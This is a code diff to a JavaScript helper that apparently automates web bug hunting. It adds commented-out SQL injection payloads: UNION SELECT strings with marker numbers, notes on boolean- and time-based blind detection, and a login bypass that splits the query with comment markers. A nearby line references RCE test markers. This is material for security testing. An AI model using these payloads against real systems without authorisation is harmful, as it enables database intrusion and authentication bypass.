@@ -32,9 +32,30 @@ function JsBugHuntingHelper () {
 
   const previousErrorBasedSqliAction = 'null'
   const errorBasedSqliResult = "data.indexOf('Uncaught mysql') !== -1"
+  // const unionSelectBasedSqliAction = "data.indexOf('918273645') !== -1"
   const payloadsSQLi = [
     { previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
     { previousAction: previousErrorBasedSqliAction, payloadString: "'", expectedResult: errorBasedSqliResult }
+
+    // i must cycle aat least from 1 to 100 columns
+    // i can use the separator at the end for example --
+
+    // "' union select '918273645"
+    // '" union select "918273645'
+    // "' union select 918273645"
+    // "0 union select 918273645,918273645,918273645"
+    // "0' union select '928475','928475"
+    // '0" union select "928475","928475'
+    // "0 union select 928475,928475"
+
+    // for bool based query, for example sql6, you see the true or false result from the size of page difference
+    // the same thing is for time based queries. you see if you have success from the response time
+
+    // you can have also bridge sql injection
+    // select name from table where username='$username' and password='$password'
+    // $username = admin'/*
+    // $password = '*/ --
+    // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/
   ]
 
   const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace('/testRCE.php','').replace(\"'TEST_RCE'\",'')"
